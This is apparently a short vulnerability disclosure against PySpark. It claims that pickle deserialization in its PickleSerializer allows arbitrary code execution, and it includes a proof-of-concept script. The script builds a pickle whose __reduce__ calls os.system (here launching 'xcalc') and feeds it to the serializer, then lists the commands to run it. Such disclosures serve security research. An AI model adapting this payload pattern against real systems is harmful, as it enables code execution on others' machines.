# Description
Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```python
import os
import pickle
#os.system('pip3 install pyspark')
from pyspark import serializers
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#Exploiting
dumps = pickle.dumps(ArbitraryCode())
dumps2 = pickle.dumps(ArbitraryCode())
serializers.PickleSerializer.loads(dumps,dumps2)
```
* `pip3 install pyspark`
* `python3 exploit.py`
